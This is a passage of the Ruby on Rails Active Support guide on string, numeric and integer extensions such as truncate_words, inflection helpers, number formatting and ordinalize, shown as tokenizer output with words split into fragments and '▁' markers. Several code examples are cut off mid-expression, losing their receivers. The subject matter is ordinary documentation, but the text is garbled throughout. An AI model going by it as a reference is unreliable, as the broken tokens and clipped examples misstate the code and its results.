▁I ▁shall ▁be ▁late !" . truncate _ words ( 4 )
▁I ▁shall ▁be ▁late !" . truncate _ words ( 4 , ▁omission : ▁' & hel li p ; ')
▁O h ▁ de ar !
▁I ▁shall ▁be ▁late !" . truncate _ words ( 3 , ▁ separator : ▁' ! ')
▁O h ▁ de ar !
▁I ▁shall ▁be ▁late ..."
▁I ▁shall ▁be ▁late !" . truncate _ words ( 4 , ▁ separator : ▁/ \ s / )
▁### ▁` in q u ir y `
▁The ▁` in q u ir y ` ▁method ▁convert s ▁a ▁string ▁into ▁a ▁` String In q u ir er ` ▁object ▁making ▁equal ity ▁check s ▁pre tt i er .
▁" production ". in q u ir y . production ?
▁" active ". in q u ir y . in active ?
▁### ▁` start s _ with ?` ▁and ▁` end s _ with ?`
▁Active ▁Support ▁defines ▁3 r d ▁person ▁alias es ▁of ▁` String # start _ with ?` ▁and ▁` String # end _ with ?` :
▁f ") ▁# ▁=> ▁true
▁ o ") ▁# ▁=> ▁true
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / start s _ end s _ with . rb `.
▁### ▁` str ip _ h er e doc `
▁The ▁method ▁` str ip _ h er e doc ` ▁ str ips ▁indentation ▁in ▁here doc s .
▁For ▁example ▁in
▁if ▁options [: us age ]
▁put s ▁< < - U S A G E . str ip _ h er e doc
▁This ▁command ▁does ▁such ▁and ▁such .
▁Support ed ▁options ▁are :
▁- h ▁This ▁message
▁...
▁U S A G E
▁the ▁user ▁would ▁see ▁the ▁usage ▁message ▁a li g n ed ▁again st ▁the ▁left ▁m ar g in .
▁ Technical ly , ▁it ▁look s ▁for ▁the ▁least ▁ indent ed ▁line ▁in ▁the ▁whole ▁string , ▁and ▁remove s < n > that ▁amount ▁of ▁leading ▁whitespace .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / str ip . rb `.
▁### ▁` indent `
▁Inde n t s ▁the ▁lines ▁in ▁the ▁receiver :
▁< < E O S . indent (2)
▁def ▁some _ method
▁some _ code
▁def ▁some _ method
▁some _ code
▁The ▁second ▁argument , ▁` indent _ string `, ▁specifie s ▁which ▁ indent ▁string ▁to ▁use .
▁The ▁default ▁is ▁` nil `, ▁which ▁tell s ▁the ▁method ▁to ▁make ▁an ▁ ed u cat ed ▁guess ▁p e e k ing ▁at ▁the ▁first ▁ indent ed ▁line , ▁and ▁f all back ▁to ▁a ▁ space ▁if ▁there ▁is ▁non e .
▁" ▁ foo ". indent (2) ▁# ▁=> ▁" ▁ foo "
▁" foo \ n \ t \ t bar ". indent (2) ▁# ▁=> ▁" \ t \ t foo \ n \ t \ t \ t \ t bar "
▁" foo ". indent ( 2 , ▁" \ t ") ▁# ▁=> ▁" \ t \ t foo "
▁Whi le ▁` indent _ string ` ▁is ▁typical ly ▁one ▁ space ▁or ▁tab , ▁it ▁may ▁be ▁any ▁string .
▁The ▁third ▁argument , ▁` indent _ empty _ line s `, ▁is ▁a ▁flag ▁that ▁say s ▁whether ▁empty ▁lines ▁should ▁be ▁ indent ed .
▁Default ▁is ▁false .
▁" foo \ n \ n bar ". indent (2) ▁# ▁=> ▁" ▁ foo \ n \ n ▁bar "
▁" foo \ n \ n bar ". indent ( 2 , ▁nil , ▁true ) ▁# ▁=> ▁" ▁ foo \ n ▁\ n ▁bar "
▁The ▁` indent !` ▁method ▁perform s ▁indentation ▁in - place .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / indent . rb `.
▁### ▁Access
▁#### ▁` at ( position )`
▁Return s ▁the ▁character ▁of ▁the ▁string ▁at ▁position ▁` position ` :
▁" hello ". at (0) ▁# ▁=> ▁" h "
▁" hello ". at ( 4 ) ▁# ▁=> ▁" o "
▁" hello ". at ( - 1 ) ▁# ▁=> ▁" o "
▁" hello ". at (10) ▁# ▁=> ▁nil
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / access . rb `.
▁#### ▁` from ( position )`
▁Return s ▁the ▁sub string ▁of ▁the ▁string ▁starting ▁at ▁position ▁` position ` :
▁" hello ". from (0) ▁# ▁=> ▁" hello "
▁" hello ". from (2) ▁# ▁=> ▁" ll o "
▁" hello ". from ( - 2 ) ▁# ▁=> ▁" lo "
▁#### ▁` to ( position )`
▁Return s ▁the ▁sub string ▁of ▁the ▁string ▁up ▁to ▁position ▁` position ` :
▁" hello ". to (0) ▁# ▁=> ▁" h "
▁" hello ". to (2) ▁# ▁=> ▁" hel "
▁" hello ". to ( - 2 ) ▁# ▁=> ▁" hel l "
▁" hello ". to (10) ▁# ▁=> ▁" hello "
▁#### ▁` first ( limit ▁= ▁1) `
▁The ▁call ▁` str . first ( n )` ▁is ▁equivalent ▁to ▁` str . to ( n - 1 )` ▁if ▁` n ` ▁ > ▁0 , ▁and ▁returns ▁an ▁empty ▁string ▁for ▁` n ` ▁== ▁0 .
▁#### ▁` last ( limit ▁= ▁1) `
▁### ▁In f l ection s
▁#### ▁` pluralize `
▁The ▁method ▁` pluralize ` ▁returns ▁the ▁plural ▁of ▁its ▁receiver :
▁" table ". pluralize ▁# ▁=> ▁" table s "
▁" ruby ". pluralize ▁# ▁=> ▁" ru b ies "
▁" equ ip ment ". pluralize ▁# ▁=> ▁" equ ip ment "
▁As ▁the ▁previous ▁example ▁shows , ▁Active ▁Support ▁know s ▁some ▁ ir r egular ▁plural s ▁and ▁un count able ▁no un s .
▁B u il t - in ▁rules ▁can ▁be ▁extend ed ▁in ▁` config / initializers / inflect ion s . rb `.
▁That ▁file ▁is ▁generated ▁by ▁the ▁` rails ` ▁command ▁and ▁has ▁instructions ▁in ▁comments .
▁` pluralize ` ▁can ▁also ▁take ▁an ▁optional ▁` count ` ▁parameter .
▁For ▁any ▁other ▁value ▁of ▁` count ` ▁the ▁plural ▁form ▁will ▁be ▁returned :
▁" dude ". pluralize (0) ▁# ▁=> ▁" dude s "
▁" dude ". pluralize (1) ▁# ▁=> ▁" dude "
▁" dude ". pluralize (2) ▁# ▁=> ▁" dude s "
▁Active ▁Record ▁uses ▁this ▁method ▁to ▁compute ▁the ▁default ▁table ▁name ▁that ▁correspond s ▁to ▁a ▁model :
▁# ▁active _ record / model _ schema . rb
▁def ▁un d ec or at ed _ table _ name ( class _ name ▁= ▁base _ class . name )
▁table _ name ▁= ▁class _ name . to _ s . demodulize . underscore
▁ pluralize _ table _ name s ▁ ?
▁table _ name . pluralize ▁: ▁table _ name
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / inflect ion s . rb `.
▁#### ▁` singularize `
▁The ▁inverse ▁of ▁` pluralize ` :
▁" table s ". singularize ▁# ▁=> ▁" table "
▁" ru b ies ". singularize ▁# ▁=> ▁" ruby "
▁" equ ip ment ". singularize ▁# ▁=> ▁" equ ip ment "
▁Associations ▁compute ▁the ▁name ▁of ▁the ▁corresponding ▁default ▁ associated ▁class ▁using ▁this ▁method :
▁# ▁active _ record / ref l ection . rb
▁def ▁d er ive _ class _ name
▁class _ name ▁= ▁name . to _ s . camelize
▁class _ name ▁= ▁class _ name . singularize ▁if ▁collection ?
▁class _ name
▁#### ▁` camelize `
▁The ▁method ▁` camelize ` ▁returns ▁its ▁receiver ▁in ▁c am el ▁case :
▁" product ". camelize ▁# ▁=> ▁" Product "
▁" admin _ user ". camelize ▁# ▁=> ▁" Admin User "
▁As ▁a ▁rule ▁of ▁thumb ▁you ▁can ▁think ▁of ▁this ▁method ▁as ▁the ▁one ▁that ▁ transform s ▁paths ▁into ▁Ruby ▁class ▁or ▁module ▁names , ▁where ▁ slash es ▁separate ▁ namespace s :
▁" b ackoffice / session ". camelize ▁# ▁=> ▁" B ackoffice :: Session "
▁For ▁example , ▁Action ▁Pack ▁uses ▁this ▁method ▁to ▁load ▁the ▁class ▁that ▁provides ▁a ▁certain ▁session ▁store :
▁# ▁action _ controller / meta l / session _ ma n age ment . rb
▁def ▁session _ store = ( store )
▁@ @ session _ store ▁= ▁store . is _ a ?(
▁ Symbol ) ▁ ?
▁ ActionDispatch :: Session . const _ get ( store . to _ s . camelize ) ▁:
▁store
▁` camelize ` ▁accept s ▁an ▁optional ▁argument , ▁it ▁can ▁be ▁`: up p er ` ▁( default ), ▁or ▁`: low er `.
▁With ▁the ▁latter ▁the ▁first ▁letter ▁becomes ▁lower case :
▁" visual _ e ffect ". camelize (: low er ) ▁# ▁=> ▁" visual E ffect "
▁That ▁may ▁be ▁hand y ▁to ▁compute ▁method ▁names ▁in ▁a ▁language ▁that ▁follows ▁that ▁convention , ▁for ▁example ▁JavaScript .
▁INFO : ▁As ▁a ▁rule ▁of ▁thumb ▁you ▁can ▁think ▁of ▁` camelize ` ▁as ▁the ▁inverse ▁of ▁` underscore `, ▁though ▁there ▁are ▁cases ▁where ▁that ▁does ▁not ▁hold : ▁` " SSL Error ". underscore . camelize ` ▁gives ▁back ▁` " S s l Error " `.
▁To ▁support ▁cases ▁such ▁as ▁this , ▁Active ▁Support ▁allows ▁you ▁to ▁specify ▁ acronym s ▁in ▁` config / initializers / inflect ion s . rb ` :
▁ inflect . acronym ▁' SSL '
▁" SSL Error ". underscore . camelize ▁# ▁=> ▁" SSL Error "
▁` camelize ` ▁is ▁alias ed ▁to ▁` c am el case `.
▁#### ▁` underscore `
▁The ▁method ▁` underscore ` ▁go es ▁the ▁other ▁way ▁around , ▁from ▁c am el ▁case ▁to ▁paths :
▁" Product ". underscore ▁# ▁=> ▁" product "
▁" Admin User ". underscore ▁# ▁=> ▁" admin _ user "
▁Also ▁convert s ▁" :: " ▁back ▁to ▁" / " :
▁" B ackoffice :: Session ". underscore ▁# ▁=> ▁" b ackoffice / session "
▁and ▁understand s ▁strings ▁that ▁start ▁with ▁lower case :
▁" visual E ffect ". underscore ▁# ▁=> ▁" visual _ e ffect "
▁` underscore ` ▁accept s ▁no ▁argument ▁though .
▁Rails ▁class ▁and ▁module ▁ autoload ing ▁uses ▁` underscore ` ▁to ▁infer ▁the ▁relative ▁path ▁without ▁extension ▁of ▁a ▁file ▁that ▁would ▁define ▁a ▁given ▁missing ▁constant :
▁# ▁active _ support / de p end en c ies . rb
▁def ▁load _ missing _ constant ( from _ mod , ▁ const _ name )
▁ qualified _ name ▁= ▁ qualified _ name _ for ▁from _ mod , ▁ const _ name
▁path _ suffix ▁= ▁ qualified _ name . underscore
▁INFO : ▁As ▁a ▁rule ▁of ▁thumb ▁you ▁can ▁think ▁of ▁` underscore ` ▁as ▁the ▁inverse ▁of ▁` camelize `, ▁though ▁there ▁are ▁cases ▁where ▁that ▁does ▁not ▁hold .
▁For ▁example , ▁` " SSL Error ". underscore . camelize ` ▁gives ▁back ▁` " S s l Error " `.
▁#### ▁` title ize `
▁The ▁method ▁` title ize ` ▁ capitalize s ▁the ▁words ▁in ▁the ▁receiver :
▁" al ic e ▁in ▁won d er l and ". title ize ▁# ▁=> ▁" A li ce ▁In ▁W on d er l and "
▁" f er m at ' s ▁ en ig ma ". title ize ▁# ▁=> ▁" F er m at ' s ▁E n ig ma "
▁` title ize ` ▁is ▁alias ed ▁to ▁` title case `.
▁#### ▁` dasherize `
▁The ▁method ▁` dasherize ` ▁replace s ▁the ▁ underscore s ▁in ▁the ▁receiver ▁with ▁d as h es :
▁" name ". dasherize ▁# ▁=> ▁" name "
▁" contact _ data ". dasherize ▁# ▁=> ▁" contact - data "
▁The ▁ X ML ▁serializ er ▁of ▁models ▁uses ▁this ▁method ▁to ▁ dasherize ▁ n ode ▁names :
▁# ▁active _ model / serialize r s / xml . rb
▁def ▁re format _ name ( name )
▁name ▁= ▁name . camelize ▁if ▁ camelize ?
▁ dasherize ? ▁ ?
▁name . dasherize ▁: ▁name
▁#### ▁` demodulize `
▁G ive n ▁a ▁string ▁with ▁a ▁ qualified ▁constant ▁name , ▁` demodulize ` ▁returns ▁the ▁very ▁constant ▁name , ▁that ▁is , ▁the ▁right most ▁part ▁of ▁it :
▁" Product ". demodulize ▁# ▁=> ▁" Product "
▁" B ackoffice :: UsersController ". demodulize ▁# ▁=> ▁" UsersController "
▁" Admin :: H o t el :: Re s er v ation U til s ". demodulize ▁# ▁=> ▁" Re s er v ation U til s "
▁" :: In f l ection s ". demodulize ▁# ▁=> ▁" In f l ection s "
▁" ". demodulize ▁# ▁=> ▁" "
▁Active ▁Record ▁for ▁example ▁uses ▁this ▁method ▁to ▁compute ▁the ▁name ▁of ▁a ▁ counter ▁cache ▁column :
▁def ▁ counter _ cache _ column
▁if ▁options [: counter _ cache ] ▁== ▁true
▁" # { active _ record . name . demodulize . underscore . pluralize } _ count "
▁ el s if ▁options [: counter _ cache ]
▁options [: counter _ cache ]
▁#### ▁` de constantize `
▁G ive n ▁a ▁string ▁with ▁a ▁ qualified ▁constant ▁reference ▁expression , ▁` de constantize ` ▁remove s ▁the ▁right most ▁segment , ▁generally ▁leav ing ▁the ▁name ▁of ▁the ▁constant ' s ▁contain er :
▁" Product ". de constantize ▁# ▁=> ▁" "
▁" B ackoffice :: UsersController ". de constantize ▁# ▁=> ▁" B ackoffice "
▁" Admin :: H o t el :: Re s er v ation U til s ". de constantize ▁# ▁=> ▁" Admin :: H o t el "
▁Active ▁Support ▁for ▁example ▁uses ▁this ▁method ▁in ▁` Module # qualified _ const _ set ` :
▁def ▁ qualified _ const _ set ( path , ▁value )
▁ Q u al if i ed Co n st U til s . raise _ if _ abs ol ute ( path )
▁ const _ name ▁= ▁path . demodulize
▁ mod _ name ▁= ▁path . de constantize
▁ mod ▁= ▁ mod _ name . empty ? ▁ ?
▁self ▁: ▁ qualified _ const _ get ( mod _ name )
▁ mod . const _ set ( const _ name , ▁value )
▁#### ▁` param e ter ize `
▁The ▁method ▁` param e ter ize ` ▁normal ize s ▁its ▁receiver ▁in ▁a ▁way ▁that ▁can ▁be ▁used ▁in ▁ pretty ▁URLs .
▁" John ▁S m i th ". param e ter ize ▁# ▁=> ▁" j o h n - s m i th "
▁" K ur t ▁G ö d el ". param e ter ize ▁# ▁=> ▁" k ur t - g ode l "
▁In ▁fact , ▁the ▁result ▁string ▁is ▁wrapp ed ▁in ▁an ▁instance ▁of ▁` ActiveSupport :: M ul t i by t e :: C h ar s `.
▁#### ▁` table ize `
▁The ▁method ▁` table ize ` ▁is ▁` underscore ` ▁followed ▁by ▁` pluralize `.
▁" Person ". table ize ▁# ▁=> ▁" people "
▁" Invoice ". table ize ▁# ▁=> ▁" invoice s "
▁" Invoice L ine ". table ize ▁# ▁=> ▁" invoice _ line s "
▁As ▁a ▁rule ▁of ▁thumb , ▁` table ize ` ▁returns ▁the ▁table ▁name ▁that ▁correspond s ▁to ▁a ▁given ▁model ▁for ▁simple ▁cases .
▁The ▁actual ▁implementation ▁in ▁Active ▁Record ▁is ▁not ▁ str a ight ▁` table ize ` ▁in de ed , ▁because ▁it ▁also ▁ demodulize s ▁the ▁class ▁name ▁and ▁check s ▁a ▁few ▁options ▁that ▁may ▁a ffect ▁the ▁returned ▁string .
▁#### ▁` class ify `
▁The ▁method ▁` class ify ` ▁is ▁the ▁inverse ▁of ▁` table ize `.
▁It ▁gives ▁you ▁the ▁class ▁name ▁corresponding ▁to ▁a ▁table ▁name :
▁" people ". class ify ▁# ▁=> ▁" Person "
▁" invoice s ". class ify ▁# ▁=> ▁" Invoice "
▁" invoice _ line s ". class ify ▁# ▁=> ▁" Invoice L ine "
▁The ▁method ▁understand s ▁ qualified ▁table ▁names :
▁" high r is e _ production . com p an ies ". class ify ▁# ▁=> ▁" Co mp any "
▁Note ▁that ▁` class ify ` ▁returns ▁a ▁class ▁name ▁as ▁a ▁string .
▁You ▁can ▁get ▁the ▁actual ▁class ▁object ▁in v o k ing ▁` constantize ` ▁on ▁it , ▁explained ▁next .
▁#### ▁` constantize `
▁The ▁method ▁` constantize ` ▁resolve s ▁the ▁constant ▁reference ▁expression ▁in ▁its ▁receiver :
▁" M :: X ". constantize ▁# ▁=> ▁1
▁If ▁the ▁string ▁evaluate s ▁to ▁no ▁known ▁constant , ▁or ▁its ▁content ▁is ▁not ▁even ▁a ▁valid ▁constant ▁name , ▁` constantize ` ▁raise s ▁` Name Error `.
▁Co n st ant ▁name ▁re s ol u t ion ▁by ▁` constantize ` ▁start s ▁always ▁at ▁the ▁to p - level ▁` Object ` ▁even ▁if ▁there ▁is ▁no ▁leading ▁" :: ".
▁ X ▁= ▁: in _ Object
▁ X ▁= ▁: in _ M
▁ X ▁# ▁=> ▁: in _ M
▁" :: X ". constantize ▁# ▁=> ▁: in _ Object
▁" X ". constantize ▁# ▁=> ▁: in _ Object ▁( ! )
▁So , ▁it ▁is ▁in ▁general ▁not ▁equivalent ▁to ▁what ▁Ruby ▁would ▁do ▁in ▁the ▁same ▁spot , ▁ha d ▁a ▁real ▁constant ▁be ▁evaluated .
▁Mailer ▁test ▁cases ▁obtain ▁the ▁mailer ▁being ▁test ed ▁from ▁the ▁name ▁of ▁the ▁test ▁class ▁using ▁` constantize ` :
▁# ▁action _ mailer / test _ case . rb
▁def ▁determine _ default _ mailer ( name )
▁name . sub ( / Test $ / , ▁ '') . constantize
▁rescue ▁Name Error ▁=> ▁e
▁raise ▁No n In f er r able Mailer Error . new ( name )
▁#### ▁` humanize `
▁The ▁method ▁` humanize ` ▁t we a k s ▁an ▁attribute ▁name ▁for ▁display ▁to ▁end ▁users .
▁ Specific ally ▁perform s ▁these ▁ transform ation s :
▁* ▁Appl ies ▁human ▁ inflect ion ▁rules ▁to ▁the ▁argument .
▁* ▁Delet es ▁leading ▁ underscore s , ▁if ▁any .
▁* ▁Re m o ve s ▁a ▁" _ id " ▁ suffix ▁if ▁present .
▁* ▁Re place s ▁ underscore s ▁with ▁spaces , ▁if ▁any .
▁* ▁D own case s ▁all ▁words ▁except ▁ acronym s .
▁* ▁C api t al ize s ▁the ▁first ▁word .
▁The ▁c api t al i z ation ▁of ▁the ▁first ▁word ▁can ▁be ▁turn ed ▁off ▁by ▁setting ▁the < n > + : capitalize + ▁option ▁to ▁false ▁( default ▁is ▁true ).
▁" name ". humanize ▁# ▁=> ▁" Name "
▁" author _ id ". humanize ▁# ▁=> ▁" Auth or "
▁" author _ id ". humanize ( capitalize : ▁false ) ▁# ▁=> ▁" author "
▁" comments _ count ". humanize ▁# ▁=> ▁" Comments ▁count "
▁" _ id ". humanize ▁# ▁=> ▁" I d "
▁If ▁" SSL " ▁was ▁defined ▁to ▁be ▁an ▁ acronym :
▁' ssl _ error ' . humanize ▁# ▁=> ▁" SSL ▁error "
▁The ▁helper ▁method ▁` full _ messages ` ▁uses ▁` humanize ` ▁as ▁a ▁f all back ▁to ▁include < n > attribute ▁names :
▁def ▁full _ messages
▁map ▁ { ▁| attribute , ▁message | ▁full _ message ( attribute , ▁message ) ▁ }
▁def ▁full _ message
▁ attr _ name ▁= ▁attribute . to _ s . tr (' . ' , ▁' _ ' ). humanize
▁ attr _ name ▁= ▁@ base . class . human _ attribute _ name ( attribute , ▁default : ▁ attr _ name )
▁#### ▁` foreign _ key `
▁The ▁method ▁` foreign _ key ` ▁gives ▁a ▁foreign ▁key ▁column ▁name ▁from ▁a ▁class ▁name .
▁To ▁do ▁so ▁it ▁ demodulize s , ▁ underscore s , ▁and ▁add s ▁" _ id " :
▁" User ". foreign _ key ▁# ▁=> ▁" user _ id "
▁" Invoice L ine ". foreign _ key ▁# ▁=> ▁" invoice _ line _ id "
▁" Admin :: Session ". foreign _ key ▁# ▁=> ▁" session _ id "
▁Pass ▁a ▁false ▁argument ▁if ▁you ▁do ▁not ▁want ▁the ▁ underscore ▁in ▁" _ id " :
▁" User ". foreign _ key ( false ) ▁# ▁=> ▁" user id "
▁Associations ▁use ▁this ▁method ▁to ▁infer ▁foreign ▁keys , ▁for ▁example ▁` has _ one ` ▁and ▁` has _ many ` ▁do ▁this :
▁# ▁active _ record / associations . rb
▁foreign _ key ▁= ▁options [: foreign _ key ] ▁|| ▁reflect ion . active _ record . name . foreign _ key
▁### ▁Co n version s
▁#### ▁` to _ date `, ▁` to _ time `, ▁` to _ datetime `
▁The ▁methods ▁` to _ date `, ▁` to _ time `, ▁and ▁` to _ datetime ` ▁are ▁basic ally ▁convenience ▁wrapp ers ▁around ▁` Date . _ parse ` :
▁"2010-07-27 ". to _ date ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010
▁"2010-07-27 ▁ 23 : 37 : 00 ". to _ time ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁ 23 : 37 : 00 ▁UTC ▁2010
▁"2010-07-27 ▁ 23 : 37 : 00 ". to _ datetime ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010 ▁ 23 : 37 : 00 ▁ + 0000
▁` to _ time ` ▁receive s ▁an ▁optional ▁argument ▁`: utc ` ▁or ▁`: local `, ▁to ▁indicate ▁which ▁time ▁zone ▁you ▁want ▁the ▁time ▁in :
▁"2010-07-27 ▁ 23 : 4 2 : 00 ". to _ time (: utc ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁ 23 : 4 2 : 00 ▁UTC ▁2010
▁"2010-07-27 ▁ 23 : 4 2 : 00 ". to _ time (: local ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁ 23 : 4 2 : 00 ▁ + 0 200 ▁2010
▁Default ▁is ▁`: utc `.
▁P lease ▁refer ▁to ▁the ▁documentation ▁of ▁` Date . _ parse ` ▁for ▁further ▁details .
▁INFO : ▁The ▁three ▁of ▁them ▁return ▁` nil ` ▁for ▁blank ▁receiver s .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / conversions . rb `.
▁Extensions ▁to ▁` N umeric `
▁### ▁By t es
▁All ▁number s ▁respond ▁to ▁these ▁methods :
▁ k i lo by t es
▁me g a by t es
▁g ig a by t es
▁ ter a by t es
▁p et a by t es
▁ ex a by t es
▁They ▁return ▁the ▁corresponding ▁amount ▁of ▁by t es , ▁using ▁a ▁con version ▁factor ▁of ▁10 2 4 :
▁2 . k i lo by t es ▁# ▁=> ▁20 4 8
▁3 . me g a by t es ▁# ▁=> ▁31 4 57 28
▁3 . 5 . g ig a by t es ▁# ▁=> ▁ 37 58 0 9 6 38 4
▁- 4 . ex a by t es ▁# ▁=> ▁- 4 6 11 68 60 18 4 27 3 87 9 04
▁S ing ul ar ▁forms ▁are ▁alias ed ▁so ▁you ▁are ▁able ▁to ▁say :
▁1. me g a by t e ▁# ▁=> ▁10 4 8 5 76
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / n umeric / by t es . rb `.
▁### ▁Time
▁E n able s ▁the ▁use ▁of ▁time ▁ calculations ▁and ▁declaration s , ▁like ▁` 4 5 . minute s ▁ + ▁2 . hour s ▁ + ▁4 . years `.
▁These ▁methods ▁use ▁Time # advance ▁for ▁precise ▁date ▁ calculations ▁when ▁using ▁from _ now , ▁ ago , ▁etc . < n > as ▁well ▁as ▁adding ▁or ▁sub tr ac ting ▁their ▁results ▁from ▁a ▁Time ▁object .
▁# ▁equivalent ▁to ▁Time . current . advance ( months : ▁1)
▁1. month . from _ now
▁# ▁equivalent ▁to ▁Time . current . advance ( years : ▁2 )
▁2 . years . from _ now
▁# ▁equivalent ▁to ▁Time . current . advance ( months : ▁4 , ▁ years : ▁5 )
▁( 4 . months ▁ + ▁5 . years ). from _ now
▁### ▁Format ting
▁E n able s ▁the ▁format ting ▁of ▁number s ▁in ▁a ▁variety ▁of ▁ways .
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁a ▁te le phone ▁number :
▁5 5 5 12 34 . to _ s (: phone )
▁# ▁=> ▁ 555-1234
▁ 1235551234 . to _ s (: phone )
▁# ▁=> ▁123 - 555-1234
▁ 1235551234 . to _ s (: phone , ▁are a _ code : ▁true )
▁# ▁=> ▁( 12 3 ) ▁ 555-1234
▁ 1235551234 . to _ s (: phone , ▁ delimiter : ▁" ▁" )
▁# ▁=> ▁123 ▁5 5 5 ▁123 4
▁ 1235551234 . to _ s (: phone , ▁are a _ code : ▁true , ▁extension : ▁5 5 5 )
▁# ▁=> ▁( 12 3 ) ▁ 555-1234 ▁x ▁5 5 5
▁ 1235551234 . to _ s (: phone , ▁count ry _ code : ▁1)
▁# ▁=> ▁ + 1 - 12 3- 555-1234
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁ currency :
▁ 12345 6 78 9 0 . 50 . to _ s (: currency ) ▁# ▁=> ▁ $ 1, 23 4 , 5 6 7 , 89 0 . 50
▁ 12345 6 78 9 0 . 5 06 . to _ s (: currency ) ▁# ▁=> ▁ $ 1, 23 4 , 5 6 7 , 89 0 . 5 1
▁ 12345 6 78 9 0 . 5 06 . to _ s (: currency , ▁ precision : ▁3 ) ▁# ▁=> ▁ $ 1, 23 4 , 5 6 7 , 89 0 . 5 06
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁a ▁ percentage :
▁100 . to _ s (: percentage )
▁# ▁=> ▁100 . 000 %
▁100 . to _ s (: percentage , ▁ precision : ▁0 )
▁# ▁=> ▁100 %
▁100 0 . to _ s (: percentage , ▁ delimiter : ▁' . ' , ▁ separator : ▁' , ')
▁# ▁=> ▁1. 000 , 000 %
▁30 2 . 2 4 39 89 23 4 23 . to _ s (: percentage , ▁ precision : ▁5 )
▁# ▁=> ▁30 2 . 2 4 3 99 %
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁in ▁ de limited ▁form :
▁12345678. to _ s (: de limited ) ▁# ▁=> ▁ 12 , 34 5 , 6 78
▁12345678. 0 5 . to _ s (: de limited ) ▁# ▁=> ▁ 12 , 34 5 , 6 78 . 0 5
▁12345678. to _ s (: de limited , ▁ delimiter : ▁" . ")
▁# ▁=> ▁ 12 . 34 5 . 6 78
▁12345678. to _ s (: de limited , ▁ delimiter : ▁" , ") ▁# ▁=> ▁ 12 , 34 5 , 6 78
▁12345678. 0 5 . to _ s (: de limited , ▁ separator : ▁" ▁" ) ▁# ▁=> ▁ 12 , 34 5 , 6 78 ▁0 5
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁ rounded ▁to ▁a ▁ precision :
▁ 11 1.23 4 5 . to _ s (: rounded ) ▁# ▁=> ▁ 11 1.23 5
▁ 11 1.23 4 5 . to _ s (: rounded , ▁ precision : ▁2 ) ▁# ▁=> ▁ 11 1.23
▁1 3 . to _ s (: rounded , ▁ precision : ▁5 ) ▁# ▁=> ▁1 3 . 0 0000
▁3 89 . 3 23 1 4 . to _ s (: rounded , ▁ precision : ▁0 ) ▁# ▁=> ▁3 89
▁ 11 1.23 4 5 . to _ s (: rounded , ▁significant : ▁true ) ▁# ▁=> ▁1 11
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁a ▁human - read able ▁number ▁of ▁by t es :
▁123 . to _ s (: human _ size ) ▁# ▁=> ▁123 ▁By t es
▁123 4 . to _ s (: human _ size ) ▁# ▁=> ▁1. 2 1 ▁ K B
▁ 12345 . to _ s (: human _ size ) ▁# ▁=> ▁ 12 . 1 ▁ K B
▁ 12345 6 7 . to _ s (: human _ size ) ▁# ▁=> ▁1. 18 ▁M B
▁ 12345 6 78 9 0 . to _ s (: human _ size ) ▁# ▁=> ▁1. 15 ▁G B
▁ 12345 6 78 9 0 12 3 . to _ s (: human _ size ) ▁# ▁=> ▁1. 12 ▁T B
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁in ▁human - read able ▁words :
▁123 . to _ s (: human ) ▁# ▁=> ▁" 12 3 "
▁123 4 . to _ s (: human ) ▁# ▁=> ▁" 1.23 ▁T h ous and "
▁ 12345 . to _ s (: human ) ▁# ▁=> ▁" 12 . 3 ▁T h ous and "
▁ 12345 6 7 . to _ s (: human ) ▁# ▁=> ▁" 1.23 ▁M i ll ion "
▁ 12345 6 78 9 0 . to _ s (: human ) ▁# ▁=> ▁" 1.23 ▁B i ll ion "
▁ 12345 6 78 9 0 12 3 . to _ s (: human ) ▁# ▁=> ▁" 1.23 ▁T r i ll ion "
▁ 12345 6 78 9 0 12345 6 . to _ s (: human ) ▁# ▁=> ▁" 1.23 ▁ Q u ad r i ll ion "
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / n umeric / conversions . rb `.
▁Extensions ▁to ▁` In t eg er `
▁### ▁` multiple _ of ?
▁The ▁method ▁` multiple _ of ?` ▁tests ▁whether ▁an ▁integer ▁is ▁multiple ▁of ▁the ▁argument :
▁1) ▁# ▁=> ▁true
▁2 ) ▁# ▁=> ▁false
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / integer / multiple . rb `.
▁### ▁` ordinal `
▁The ▁method ▁` ordinal ` ▁returns ▁the ▁ ordinal ▁ suffix ▁string ▁corresponding ▁to ▁the ▁receiver ▁integer :
▁1. ordinal ▁# ▁=> ▁" st "
▁2 . ordinal ▁# ▁=> ▁" n d "
▁5 3 . ordinal ▁# ▁=> ▁" r d "
▁200 9 . ordinal ▁# ▁=> ▁" th "
▁- 2 1 . ordinal ▁# ▁=> ▁" st "
▁- 1 34 . ordinal ▁# ▁=> ▁" th "
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / integer / inflect ion s . rb `.
▁### ▁` ordinal ize `
▁The ▁method ▁` ordinal ize ` ▁returns ▁the ▁ ordinal ▁string ▁corresponding ▁to ▁the ▁receiver ▁integer .
▁In ▁comparison , ▁note ▁that ▁the ▁` ordinal ` ▁method ▁returns ▁** only ** ▁the ▁ suffix ▁string .
▁1. ordinal ize ▁# ▁=> ▁" 1 st "
▁2 . ordinal ize ▁# ▁=> ▁" 2 n d "
▁5 3 . ordinal ize ▁# ▁=> ▁" 5 3 r d "
▁- 2 1 . ordinal ize ▁# ▁=> ▁" - 2 1 st "
▁- 1 34 . ordinal ize ▁# ▁=> ▁" - 1 34 th "
